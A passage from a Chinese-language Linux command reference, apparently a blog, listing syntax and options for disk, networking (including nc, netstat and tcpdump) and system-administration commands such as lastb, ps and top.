显示硬盘的磁轨，磁头，磁区等参数。<br>-h 显示帮助。<br>-i 显示硬盘的硬件规格信息，这些信息是在开机时由硬盘本身所提供。<br>-I 直接读取硬盘所提供的硬件规格信息。<br>-k&lt;0或1&gt; 重设硬盘时，保留-dmu参数的设定。<br>-K&lt;0或1&gt; 重设硬盘时，保留-APSWXZ参数的设定。<br>-m&lt;磁区数&gt; 设定硬盘多重分区存取的分区数。<br>-n&lt;0或1&gt; 忽略硬盘写入时所发生的错误。<br>-p&lt;PIO模式&gt; 设定硬盘的PIO模式。<br>-P&lt;磁区数&gt; 设定硬盘内部快取的分区数。<br>-q 在执行后续的参数时，不在屏幕上显示任何信息。<br>-r&lt;0或1&gt; 设定硬盘的读写模式。<br>-S&lt;时间&gt; 设定硬盘进入省电模式前的等待时间。<br>-t 评估硬盘的读取效率。<br>-T 评估硬盘快取的读取效率。<br>-u&lt;0或1&gt; 在硬盘存取时，允许其他中断要求同时执行。<br>-v 显示硬盘的相关设定。<br>-W&lt;0或1&gt; 设定硬盘的写入快取。<br>-X&lt;传输模式&gt; 设定硬盘的传输模式。<br>-y 使IDE硬盘进入省电模式。<br>-Y 使IDE硬盘进入睡眠模式。<br>-Z 关闭某些Seagate硬盘的自动省电功能。</p><h4 id="mke2fs-x3D-x3D-mkfs-ext2"><a href="#mke2fs-x3D-x3D-mkfs-ext2" class="headerlink" title="mke2fs &#x3D;&#x3D; mkfs.ext2"></a>mke2fs &#x3D;&#x3D; mkfs.ext2</h4><p>Linux mke2fs命令用于建立ext2文件系统。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mke2fs <span class="hljs-selector-attr">[-cFMqrSvV]</span><span class="hljs-selector-attr">[-b &lt;区块大小&gt;]</span><span class="hljs-selector-attr">[-f &lt;不连续区段大小&gt;]</span><span class="hljs-selector-attr">[-i &lt;字节&gt;]</span><span class="hljs-selector-attr">[-N &lt;inode数&gt;]</span><span class="hljs-selector-attr">[-l &lt;文件&gt;]</span><span class="hljs-selector-attr">[-L &lt;标签&gt;]</span><span class="hljs-selector-attr">[-m &lt;百分比值&gt;]</span><span class="hljs-selector-attr">[-R=&lt;区块数&gt;]</span><span class="hljs-selector-attr">[ 设备名称]</span><span class="hljs-selector-attr">[区块数]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-b&lt;区块大小&gt; 指定区块大小，单位为字节。<br>-c 检查是否有损坏的区块。<br>-f&lt;不连续区段大小&gt; 指定不连续区段的大小，单位为字节。<br>-F 不管指定的设备为何，强制执行mke2fs。<br>-i&lt;字节&gt; 指定”字节&#x2F;inode”的比例。<br>-N&lt;inode数&gt; 指定要建立的inode数目。<br>-l&lt;文件&gt; 从指定的文件中，读取文件西中损坏区块的信息。<br>-L&lt;标签&gt; 设置文件系统的标签名称。<br>-m&lt;百分比值&gt; 指定给管理员保留区块的比例，预设为5%。<br>-M 记录最后一次挂入的目录。<br>-q 执行时不显示任何信息。<br>-r 指定要建立的ext2文件系统版本。<br>-R&#x3D;&lt;区块数&gt; 设置磁盘阵列参数。<br>-S 仅写入superblock与group descriptors，而不更改inode able inode bitmap以及block bitmap。<br>-v 执行时显示详细信息。<br>-V 显示版本信息。</p><h4 id="mkfs"><a href="#mkfs" class="headerlink" title="mkfs"></a>mkfs</h4><p>构建一个Linux文件系统。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mkfs <span class="hljs-selector-attr">[options]</span> <span class="hljs-selector-attr">[-t type]</span> <span class="hljs-selector-attr">[fs-options]</span> device <span class="hljs-selector-attr">[size]</span><br></code></pre></td></tr></table></figure><p>可以构建的系统如下：</p><p>mkfs.bfs(8), mkfs.ext2(8), mkfs.ext3(8), mkfs.ext4(8),mkfs.minix(8), mkfs.msdos(8), mkfs.vfat(8), mkfs.xfs(8)</p><h4 id="mkswap"><a href="#mkswap" class="headerlink" title="mkswap"></a>mkswap</h4><p>Linux mkswap命令用于设置交换区(swap area)。<br>mkswap可将磁盘分区或文件设为Linux的交换区。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mkswap <span class="hljs-selector-attr">[-cf]</span><span class="hljs-selector-attr">[-v0]</span><span class="hljs-selector-attr">[-v1]</span><span class="hljs-selector-attr">[设备名称或文件]</span><span class="hljs-selector-attr">[交换区大小]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-c 建立交换区前，先检查是否有损坏的区块。<br>-f 在SPARC电脑上建立交换区时，要加上此参数。<br>-v0 建立旧式交换区，此为预设值。<br>-v1 建立新式交换区。<br>[交换区大小] 指定交换区的大小，单位为1024字节。</p><h4 id="fdisk"><a href="#fdisk" class="headerlink" title="fdisk"></a>fdisk</h4><p>Linux fdisk是一个创建和维护分区表的程序，它兼容DOS类型的分区表、BSD或者SUN类型的磁盘列表。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">fdisk <span class="hljs-selector-attr">[必要参数]</span><span class="hljs-selector-attr">[选择参数]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>必要参数：<br>-l 列出素所有分区表<br>-u 与”-l”搭配使用，显示分区数目<br>选择参数：<br>-s&lt;分区编号&gt; 指定分区<br>-v 版本信息<br>菜单操作说明</p><p>m ：显示菜单和帮助信息<br>a ：活动分区标记&#x2F;引导分区<br>d ：删除分区<br>l ：显示分区类型<br>n ：新建分区<br>p ：显示分区信息<br>q ：退出不保存<br>t ：设置分区号<br>v ：进行分区检查<br>w ：保存修改<br>x ：扩展应用，高级功能</p><h4 id="swapon"><a href="#swapon" class="headerlink" title="swapon"></a>swapon</h4><p>Linux swapon命令用于激活Linux系统中交换空间，Linux系统的内存管理必须使用交换区来建立虚拟内存。 </p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">swapon -<span class="hljs-selector-tag">a</span> <span class="hljs-selector-attr">[-v]</span>       //-<span class="hljs-selector-tag">a</span> 自动启动所有SWAP装置<br></code></pre></td></tr></table></figure><h2 id="网络和系统"><a href="#网络和系统" class="headerlink" title="网络和系统"></a>网络和系统</h2><h3 id="网络通讯"><a href="#网络通讯" class="headerlink" title="网络通讯"></a>网络通讯</h3><h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><p>Linux telnet命令用于远端登入。<br>执行telnet指令开启终端机阶段作业，并登入远端主机。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">telnet <span class="hljs-selector-attr">[-8acdEfFKLrx]</span><span class="hljs-selector-attr">[-b&lt;主机别名&gt;]</span><span class="hljs-selector-attr">[-e&lt;脱离字符&gt;]</span><span class="hljs-selector-attr">[-k&lt;域名&gt;]</span><span class="hljs-selector-attr">[-l&lt;用户名称&gt;]</span><span class="hljs-selector-attr">[-n&lt;记录文件&gt;]</span><span class="hljs-selector-attr">[-S&lt;服务类型&gt;]</span><span class="hljs-selector-attr">[-X&lt;认证形态&gt;]</span><span class="hljs-selector-attr">[主机名称或IP地址&lt;通信端口&gt;]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p> -8 允许使用8位字符资料，包括输入与输出。<br>-a 尝试自动登入远端系统。<br>-b&lt;主机别名&gt; 使用别名指定远端主机名称。<br>-c 不读取用户专属目录里的.telnetrc文件。<br>-d 启动排错模式。<br>-e&lt;脱离字符&gt; 设置脱离字符。<br>-E 滤除脱离字符。<br>-f 此参数的效果和指定”-F”参数相同。<br>-F 使用Kerberos V5认证时，加上此参数可把本地主机的认证数据上传到远端主机。<br>-k&lt;域名&gt; 使用Kerberos认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名。<br>-K 不自动登入远端主机。<br>-l&lt;用户名称&gt; 指定要登入远端主机的用户名称。<br>-L 允许输出8位字符资料。<br>-n&lt;记录文件&gt; 指定文件记录相关信息。<br>-r 使用类似rlogin指令的用户界面。<br>-S&lt;服务类型&gt; 设置telnet连线所需的IP TOS信息。<br>-x 假设主机有支持数据加密的功能，就使用它。<br>-X&lt;认证形态&gt; 关闭指定的认证形态。</p><h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>实现任意TCP&#x2F;UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口<br>端口的扫描，nc可以作为client发起TCP或UDP连接<br>机器之间传输文件<br>机器之间网络测速</p><p>语法：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">nc <span class="hljs-comment">[-46CDdFhklNnrStUuvZz]</span> <span class="hljs-comment">[-I length]</span> <span class="hljs-comment">[-i interval]</span> <span class="hljs-comment">[-M ttl]</span><br>         <span class="hljs-comment">[-m minttl]</span> <span class="hljs-comment">[-O length]</span> <span class="hljs-comment">[-P proxy_username]</span> <span class="hljs-comment">[-p source_port]</span><br>         <span class="hljs-comment">[-q seconds]</span> <span class="hljs-comment">[-s source]</span> <span class="hljs-comment">[-T keyword]</span> <span class="hljs-comment">[-V rtable]</span> <span class="hljs-comment">[-W recvlimit]</span> <span class="hljs-comment">[-w timeout]</span><br>         <span class="hljs-comment">[-X proxy_protocol]</span> <span class="hljs-comment">[-x proxy_address<span class="hljs-comment">[:port]</span>]</span>           <span class="hljs-comment">[destination]</span> <span class="hljs-comment">[port]</span><br></code></pre></td></tr></table></figure><p>参数：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-l    用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。</span><br><span class="hljs-deletion">-p    暂未用到（老版本的nc可能需要在端口号前加-p参数，下面测试环境是centos6.6，nc版本是nc-1.84，未用到-p参数）</span><br><span class="hljs-deletion">-s    指定发送数据的源IP地址，适用于多网卡机</span><br><span class="hljs-deletion">-u    指定nc使用UDP协议，默认为TCP</span><br><span class="hljs-deletion">-v    输出交互或出错信息，新手调试时尤为有用</span><br><span class="hljs-deletion">-w    超时秒数，后面跟数字</span><br></code></pre></td></tr></table></figure><h4 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h4><p>Linux ifconfig命令用于显示或设置网络设备。<br>ifconfig可设置网络设备的状态，或是显示目前的设置。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ifconfig <span class="hljs-selector-attr">[网络设备]</span><span class="hljs-selector-attr">[down up -allmulti -arp -promisc]</span><span class="hljs-selector-attr">[add&lt;地址&gt;]</span><span class="hljs-selector-attr">[del&lt;地址&gt;]</span><span class="hljs-selector-attr">[&lt;hw&lt;网络设备类型&gt;&lt;硬件地址&gt;]</span><span class="hljs-selector-attr">[io_addr&lt;I/O地址&gt;]</span><span class="hljs-selector-attr">[irq&lt;IRQ地址&gt;]</span><span class="hljs-selector-attr">[media&lt;网络媒介类型&gt;]</span><span class="hljs-selector-attr">[mem_start&lt;内存地址&gt;]</span><span class="hljs-selector-attr">[metric&lt;数目&gt;]</span><span class="hljs-selector-attr">[mtu&lt;字节&gt;]</span><span class="hljs-selector-attr">[netmask&lt;子网掩码&gt;]</span><span class="hljs-selector-attr">[tunnel&lt;地址&gt;]</span><span class="hljs-selector-attr">[-broadcast&lt;地址&gt;]</span><span class="hljs-selector-attr">[-pointopoint&lt;地址&gt;]</span><span class="hljs-selector-attr">[IP地址]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p>add&lt;地址&gt; 设置网络设备IPv6的IP地址。<br>del&lt;地址&gt; 删除网络设备IPv6的IP地址。<br>down 关闭指定的网络设备。<br>&lt;hw&lt;网络设备类型&gt;&lt;硬件地址&gt; 设置网络设备的类型与硬件地址。<br>io_addr&lt;I&#x2F;O地址&gt; 设置网络设备的I&#x2F;O地址。<br>irq&lt;IRQ地址&gt; 设置网络设备的IRQ。<br>media&lt;网络媒介类型&gt; 设置网络设备的媒介类型。<br>mem_start&lt;内存地址&gt; 设置网络设备在主内存所占用的起始地址。<br>metric&lt;数目&gt; 指定在计算数据包的转送次数时，所要加上的数目。<br>mtu&lt;字节&gt; 设置网络设备的MTU。<br>netmask&lt;子网掩码&gt; 设置网络设备的子网掩码。<br>tunnel&lt;地址&gt; 建立IPv4与IPv6之间的隧道通信地址。<br>up 启动指定的网络设备。<br>-broadcast&lt;地址&gt; 将要送往指定地址的数据包当成广播数据包来处理。<br>-pointopoint&lt;地址&gt; 与指定地址的网络设备建立直接连线，此模式具有保密功能。<br>-promisc 关闭或启动指定网络设备的promiscuous模式。<br>[IP地址] 指定网络设备的IP地址。<br>[网络设备] 指定网络设备的名称。</p><h4 id="mesg和wall"><a href="#mesg和wall" class="headerlink" title="mesg和wall"></a>mesg和wall</h4><p>mesg命令用于设置终端机的写入权限。<br>将mesg设置y时，其他用户可利用write指令将信息直接显示在您的屏幕上。</p><p> wall命令会将讯息传给每一个 mesg 设定为 yes 的上线使用者。当使用终端机介面做为标准传入时, 讯息结束时需加上 EOF</p><p>语法：wall [message]</p><h4 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h4><p>netstat 命令用于显示网络状态。<br>利用 netstat 指令可让你得知整个 Linux 系统的网络情况。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">netstat <span class="hljs-selector-attr">[-acCeFghilMnNoprstuvVwx]</span><span class="hljs-selector-attr">[-A&lt;网络类型&gt;]</span><span class="hljs-selector-attr">[--ip]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p>-a或–all 显示所有连线中的Socket。<br>-A&lt;网络类型&gt;或–&lt;网络类型&gt; 列出该网络类型连线中的相关地址。<br>-c或–continuous 持续列出网络状态。<br>-C或–cache 显示路由器配置的快取信息。<br>-e或–extend 显示网络其他相关信息。<br>-F或–fib 显示FIB。<br>-g或–groups 显示多重广播功能群组组员名单。<br>-h或–help 在线帮助。<br>-i或–interfaces 显示网络界面信息表单。<br>-l或–listening 显示监控中的服务器的Socket。<br>-M或–masquerade 显示伪装的网络连线。<br>-n或–numeric 直接使用IP地址，而不通过域名服务器。<br>-N或–netlink或–symbolic 显示网络硬件外围设备的符号连接名称。<br>-o或–timers 显示计时器。<br>-p或–programs 显示正在使用Socket的程序识别码和程序名称。<br>-r或–route 显示Routing Table。<br>-s或–statistics 显示网络工作信息统计表。<br>-t或–tcp 显示TCP传输协议的连线状况。<br>-u或–udp 显示UDP传输协议的连线状况。<br>-v或–verbose 显示指令执行过程。<br>-V或–version 显示版本信息。<br>-w或–raw 显示RAW传输协议的连线状况。<br>-x或–unix 此参数的效果和指定”-A unix”参数相同。<br>–ip或–inet 此参数的效果和指定”-A inet”参数相同。</p><h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><p>执行ping指令会使用ICMP传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ping <span class="hljs-selector-attr">[-dfnqrRv]</span><span class="hljs-selector-attr">[-c&lt;完成次数&gt;]</span><span class="hljs-selector-attr">[-i&lt;间隔秒数&gt;]</span><span class="hljs-selector-attr">[-I&lt;网络界面&gt;]</span><span class="hljs-selector-attr">[-l&lt;前置载入&gt;]</span><span class="hljs-selector-attr">[-p&lt;范本样式&gt;]</span><span class="hljs-selector-attr">[-s&lt;数据包大小&gt;]</span><span class="hljs-selector-attr">[-t&lt;存活数值&gt;]</span><span class="hljs-selector-attr">[主机名称或IP地址]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-d 使用Socket的SO_DEBUG功能。<br>-c&lt;完成次数&gt; 设置完成要求回应的次数。<br>-f 极限检测。<br>-i&lt;间隔秒数&gt; 指定收发信息的间隔时间。<br>-I&lt;网络界面&gt; 使用指定的网络接口送出数据包。<br>-l&lt;前置载入&gt; 设置在送出要求信息之前，先行发出的数据包。<br>-n 只输出数值。<br>-p&lt;范本样式&gt; 设置填满数据包的范本样式。<br>-q 不显示指令执行过程，开头和结尾的相关信息除外。<br>-r 忽略普通的Routing Table，直接将数据包送到远端主机上。<br>-R 记录路由过程。<br>-s&lt;数据包大小&gt; 设置数据包的大小。<br>-t&lt;存活数值&gt; 设置存活数值TTL的大小。<br>-v 详细显示指令的执行过程。</p><h4 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h4><p>traceroute命令用于显示数据包到主机间的路径。<br>traceroute指令让你追踪网络数据包的路由途径，预设数据包大小是40Bytes，用户可另行设置。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">traceroute <span class="hljs-selector-attr">[-dFlnrvx]</span><span class="hljs-selector-attr">[-f&lt;存活数值&gt;]</span><span class="hljs-selector-attr">[-g&lt;网关&gt;...]</span><span class="hljs-selector-attr">[-i&lt;网络界面&gt;]</span><span class="hljs-selector-attr">[-m&lt;存活数值&gt;]</span><span class="hljs-selector-attr">[-p&lt;通信端口&gt;]</span><span class="hljs-selector-attr">[-s&lt;来源地址&gt;]</span><span class="hljs-selector-attr">[-t&lt;服务类型&gt;]</span><span class="hljs-selector-attr">[-w&lt;超时秒数&gt;]</span><span class="hljs-selector-attr">[主机名称或IP地址]</span><span class="hljs-selector-attr">[数据包大小]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p>-d 使用Socket层级的排错功能。<br>-f&lt;存活数值&gt; 设置第一个检测数据包的存活数值TTL的大小。<br>-F 设置勿离断位。<br>-g&lt;网关&gt; 设置来源路由网关，最多可设置8个。<br>-i&lt;网络界面&gt; 使用指定的网络界面送出数据包。<br>-I 使用ICMP回应取代UDP资料信息。<br>-m&lt;存活数值&gt; 设置检测数据包的最大存活数值TTL的大小。<br>-n 直接使用IP地址而非主机名称。<br>-p&lt;通信端口&gt; 设置UDP传输协议的通信端口。<br>-r 忽略普通的Routing Table，直接将数据包送到远端主机上。<br>-s&lt;来源地址&gt; 设置本地主机送出数据包的IP地址。<br>-t&lt;服务类型&gt; 设置检测数据包的TOS数值。<br>-w&lt;超时秒数&gt; 设置等待远端主机回报的时间。<br>-x 开启或关闭数据包的正确性检验。</p><h4 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h4><p> tcpdump命令用于倾倒网络传输数据。<br>执行tcpdump指令可列出经过指定网络界面的数据包文件头，在Linux操作系统中，你必须是系统管理员。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">tcpdump <span class="hljs-selector-attr">[-adeflnNOpqStvx]</span><span class="hljs-selector-attr">[-c&lt;数据包数目&gt;]</span><span class="hljs-selector-attr">[-dd]</span><span class="hljs-selector-attr">[-ddd]</span><span class="hljs-selector-attr">[-F&lt;表达文件&gt;]</span><span class="hljs-selector-attr">[-i&lt;网络界面&gt;]</span><span class="hljs-selector-attr">[-r&lt;数据包文件&gt;]</span><span class="hljs-selector-attr">[-s&lt;数据包大小&gt;]</span><span class="hljs-selector-attr">[-tt]</span><span class="hljs-selector-attr">[-T&lt;数据包类型&gt;]</span><span class="hljs-selector-attr">[-vv]</span><span class="hljs-selector-attr">[-w&lt;数据包文件&gt;]</span><span class="hljs-selector-attr">[输出数据栏位]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p>-a 尝试将网络和广播地址转换成名称。<br>-c&lt;数据包数目&gt; 收到指定的数据包数目后，就停止进行倾倒操作。<br>-d 把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出。<br>-dd 把编译过的数据包编码转换成C语言的格式，并倾倒到标准输出。<br>-ddd 把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出。<br>-e 在每列倾倒资料上显示连接层级的文件头。<br>-f 用数字显示网际网络地址。<br>-F&lt;表达文件&gt; 指定内含表达方式的文件。<br>-i&lt;网络界面&gt; 使用指定的网络截面送出数据包。<br>-l 使用标准输出列的缓冲区。<br>-n 不把主机的网络地址转换成名字。<br>-N 不列出域名。<br>-O 不将数据包编码最佳化。<br>-p 不让网络界面进入混杂模式。<br>-q 快速输出，仅列出少数的传输协议信息。<br>-r&lt;数据包文件&gt; 从指定的文件读取数据包数据。<br>-s&lt;数据包大小&gt; 设置每个数据包的大小。<br>-S 用绝对而非相对数值列出TCP关联数。<br>-t 在每列倾倒资料上不显示时间戳记。<br>-tt 在每列倾倒资料上显示未经格式化的时间戳记。<br>-T&lt;数据包类型&gt; 强制将表达方式所指定的数据包转译成设置的数据包类型。<br>-v 详细显示指令执行过程。<br>-vv 更详细显示指令执行过程。<br>-x 用十六进制字码列出数据包资料。<br>-w&lt;数据包文件&gt; 把数据包数据写入指定的文件。</p><h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><h4 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h4><p>adduser命令用于新增使用者帐号或更新预设的使用者资料。<br>adduser 与 useradd 指令为同一指令（经由符号连结 symbolic link）。<br>使用权限：系统管理员。<br>adduser是增加使用者。相对的，也有删除使用者的指令，userdel。语法:userdel [login ID]</p><p>语法：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">adduser <span class="hljs-comment">[-c comment]</span> <span class="hljs-comment">[-d home_dir]</span> <span class="hljs-comment">[-e expire_date]</span> <span class="hljs-comment">[-f inactive_time]</span> <span class="hljs-comment">[-g initial_group]</span> <span class="hljs-comment">[-G group<span class="hljs-comment">[,...]</span>]</span> <span class="hljs-comment">[-m <span class="hljs-comment">[-k skeleton_dir]</span> | -M]</span> <span class="hljs-comment">[-p passwd]</span> <span class="hljs-comment">[-s shell]</span> <span class="hljs-comment">[-u uid <span class="hljs-comment">[ -o]</span>]</span> <span class="hljs-comment">[-n]</span> <span class="hljs-comment">[-r]</span> loginid<br></code></pre></td></tr></table></figure><p>参数：</p><p>-c comment 新使用者位于密码档（通常是 &#x2F;etc&#x2F;passwd）的注解资料<br>-d home_dir 设定使用者的家目录为 home_dir ，预设值为预设的 home 后面加上使用者帐号 loginid<br>-e expire_date 设定此帐号的使用期限（格式为 YYYY-MM-DD），预设值为永久有效</p><h4 id="chfn"><a href="#chfn" class="headerlink" title="chfn"></a>chfn</h4><p>chfn命令提供使用者更改个人资讯，用于 finger and mail username<br>使用权限：所有使用者。</p><h4 id="组管理"><a href="#组管理" class="headerlink" title="组管理"></a>组管理</h4><p>groupadd 添加一个组</p><p>groupmod 用于更改群组识别码或名称</p><p>groupdel 用于删除群组</p><h4 id="halt"><a href="#halt" class="headerlink" title="halt"></a>halt</h4><p>若系统的 runlevel 为 0 或 6 ，则Linux halt命令关闭系统，否则以 shutdown 指令（加上 -h 参数）来取代。<br>使用权限：系统管理者。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">halt <span class="hljs-selector-attr">[-n]</span> <span class="hljs-selector-attr">[-w]</span> <span class="hljs-selector-attr">[-d]</span> <span class="hljs-selector-attr">[-f]</span> <span class="hljs-selector-attr">[-i]</span> <span class="hljs-selector-attr">[-p]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-n : 在关机前不做将记忆体资料写回硬盘的动作<br>-w : 并不会真的关机，只是把记录写到 &#x2F;var&#x2F;log&#x2F;wtmp 文件里<br>-d : 不把记录写到 &#x2F;var&#x2F;log&#x2F;wtmp 文件里（-n 这个参数包含了 -d） -f : 强迫关机，不呼叫 shutdown 这个指令<br>-i : 在关机之前先把所有网络相关的装置先停止<br>-p : 当关机的时候，顺便做关闭电源（poweroff）的动作</p><h4 id="last"><a href="#last" class="headerlink" title="last"></a>last</h4><p> last 命令用于显示用户最近登录信息。</p><p>语法：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">last</span> [<span class="hljs-keyword">options</span>]<br></code></pre></td></tr></table></figure><p>参数：</p><p>-R 省略 hostname 的栏位<br>-num 展示前 num 个<br>username 展示 username 的登入讯息<br>tty 限制登入讯息包含终端机代号</p><h4 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h4><p>lastb命令用于列出登入系统失败的用户相关信息。<br>单独执行lastb指令，它会读取位于&#x2F;var&#x2F;log目录下，名称为btmp的文件，并把该文件内容<br>记录的登入失败的用户名单，全部显示出来。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">lastb <span class="hljs-selector-attr">[-adRx]</span><span class="hljs-selector-attr">[-f &lt;记录文件&gt;]</span><span class="hljs-selector-attr">[-n &lt;显示列数&gt;]</span><span class="hljs-selector-attr">[帐号名称...]</span><span class="hljs-selector-attr">[终端机编号...]</span><br></code></pre></td></tr></table></figure><p>-a 　把从何处登入系统的主机名称或IP地址显示在最后一行。<br>-d 　将IP地址转换成主机名称。<br>-f&lt;记录文件&gt; 　指定记录文件。<br>-n&lt;显示列数&gt;或-&lt;显示列数&gt; 　设置列出名单的显示列数。<br>-R 　不显示登入系统的主机名称或IP地址。<br>-x 　显示系统关机，重新开机，以及执行等级的改变等信息。</p><p>可以通过查看异常登录确定服务器是否遭受ssh爆破攻击，防范手段一般是进行ip的限制和禁止root用户登录和</p><p>修改默认的端口。</p><h4 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h4><p>ps （英文全拼：process status）命令用于显示当前进程的状态，类似于 windows 的任务管理器</p><p>语法：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> [<span class="hljs-keyword">options</span>] [--<span class="hljs-keyword">help</span>]<br></code></pre></td></tr></table></figure><p>参数：</p><p>ps 的参数非常多, 在此仅列出几个常用的参数并大略介绍含义<br>-A 列出所有的行程<br>-w 显示加宽可以显示较多的资讯<br>-au 显示较详细的资讯<br>-aux 显示所有包含其他使用者的行程<br>au(x) 输出格式 :<br>USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND<br>USER: 行程拥有者<br>PID: pid<br>%CPU: 占用的 CPU 使用率<br>%MEM: 占用的记忆体使用率<br>VSZ: 占用的虚拟记忆体大小<br>RSS: 占用的记忆体大小<br>TTY: 终端的次要装置号码 (minor device number of tty)<br>STAT: 该行程的状态:<br>D: 无法中断的休眠状态 (通常 IO 的进程)<br>R: 正在执行中<br>S: 静止状态<br>T: 暂停执行<br>Z: 不存在但暂时无法消除<br>W: 没有足够的记忆体分页可分配<br>&lt;: 高优先序的行程<br>N: 低优先序的行程<br>L: 有记忆体分页分配并锁在记忆体内 (实时系统或捱A I&#x2F;O)<br>START: 行程开始时间<br>TIME: 执行的时间<br>COMMAND:所执行的指令</p><h4 id="nice"><a href="#nice" class="headerlink" title="nice"></a>nice</h4><p>nice命令以更改过的优先序来执行程序，如果未指定程序，则会印出目前的排程优先序，内定的 adjustment 为 10，范围为 -20（最高优先序）到 19（最低优先序）。</p><p>语法：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">nice <span class="hljs-comment">[-n adjustment]</span> <span class="hljs-comment">[-adjustment]</span> <span class="hljs-comment">[--adjustment=adjustment]</span> <span class="hljs-comment">[--help]</span> <span class="hljs-comment">[--version]</span> <span class="hljs-comment">[command <span class="hljs-comment">[arg...]</span>]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-n adjustment, -adjustment, –adjustment&#x3D;adjustment 皆为将该原有优先序的增加 adjustment<br>–help 显示求助讯息<br>–version 显示版本资讯</p><h4 id="top"><a href="#top" class="headerlink" title="top"></a>top</h4><p>top命令用于实时显示 process 的动态。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">top</span> <span class="hljs-selector-attr">[-]</span> <span class="hljs-selector-attr">[d delay]</span> <span class="hljs-selector-attr">[q]</span> <span class="hljs-selector-attr">[c]</span> <span class="hljs-selector-attr">[S]</span> <span class="hljs-selector-attr">[s]</span> <span class="hljs-selector-attr">[i]</span> <span class="hljs-selector-attr">[n]</span> <span class="hljs-selector-attr">[b]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>d : 改变显示的更新速度，或是在交谈式指令列( interactive command)按 s<br>q : 没有任何延迟的显示速度，如果使用者是有 superuser 的权限，则 top 将会以最高的优先序执行<br>c : 切换显示模式，共有两种模式，一是只显示执行档的名称，另一种是显示完整的路径与名称S : 累积模式，会将己完成或消失的子行程 ( dead child process ) 的 CPU time 累积起来<br>s : 安全模式，将交谈式指令取消, 避免潜在的危机<br>i : 不显示任何闲置 (idle) 或无用 (zombie) 的行程<br>n : 更新的次数，完成后将会退出 top<br>b : 批次档模式，搭配 “n” 